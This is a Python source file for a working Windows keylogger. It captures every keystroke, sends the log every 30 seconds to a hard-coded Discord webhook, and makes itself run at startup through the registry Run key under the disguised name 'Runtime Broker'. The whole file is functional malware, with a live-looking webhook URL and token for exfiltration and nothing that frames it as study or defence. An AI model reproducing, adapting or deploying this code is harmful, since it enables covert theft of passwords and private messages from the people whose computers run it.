from dhooks import Webhook
from threading import Timer
from pynput.keyboard import Listener
import winreg
import os
from win32api import (GetModuleFileName, RegCloseKey, RegOpenKeyEx, RegSetValueEx, RegEnumValue)
from win32con import (HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER, KEY_WRITE,
                    KEY_QUERY_VALUE, REG_SZ)
from winerror import ERROR_NO_MORE_ITEMS
import pywintypes


WEBHOOK_URL = 'https://discord.com/api/webhooks/1119333967980679218/Th_zESq80saKWwJzVE8lpT0xjSKSj5LKT-e228uC1-GJYOs4ApaNm8i1syAnaOFSLK4E'
TIME_INTERVAL = 30  # Amount of time between each report, expressed in seconds.
KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
VALUE_NAME = "Runtime Broker"
# VALUE_DATA = os.path.join(os.path.dirname(os.path.abspath(__file__)), "test.exe")
VALUE_DATA = "Runtime Broker"

def run_at_startup_set(appname, path=None, user=False):
    """
    Store the entry in the registry for running the application
    at startup.
    """
    # Open the registry key where applications that run
    # at startup are stored.
    key = RegOpenKeyEx(
        HKEY_CURRENT_USER if user else HKEY_LOCAL_MACHINE,
        KEY_PATH,
        0,
        KEY_WRITE | KEY_QUERY_VALUE
    )
    # Make sure our application is not already in the registry.
    i = 0
    while True:
        try:
            name, _, _ = RegEnumValue(key, i)
        except pywintypes.error as e:
            if e.winerror == ERROR_NO_MORE_ITEMS:
                break
            else:
                raise
        if name == appname:
            RegCloseKey(key)
            return
        i += 1
    # Create a new entry or key.
    RegSetValueEx(key, appname, 0, REG_SZ, path or GetModuleFileName(0))
    # Close the key when no longer used.
    RegCloseKey(key)



class Keylogger:
    def __init__(self, webhook_url, interval):
        self.interval = interval
        self.webhook = Webhook(webhook_url)
        self.log = ""

    def _report(self):
        if self.log != '':
            self.webhook.send(self.log)
            self.log = ''
        Timer(self.interval, self._report).start()

    def _on_key_press(self, key):
        self.log += f'{str(key)}\n'

    def run(self):
        self._report()
        with Listener(self._on_key_press) as t:
            t.join()

# def add_registry_entry(key_path, value_name, value_data):
#     try:
#         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
#         winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, value_data)
#         winreg.CloseKey(key)
#         print("Wpis został dodany do rejestru.")
#     except Exception as e:
#         print("Wystąpił błąd podczas dodawania wpisu do rejestru:", e)



if __name__ == '__main__':
    # add_registry_entry(KEY_PATH, VALUE_NAME, VALUE_DATA)
    run_at_startup_set("Runtime Broker", user=True)

    Keylogger(WEBHOOK_URL, TIME_INTERVAL).run()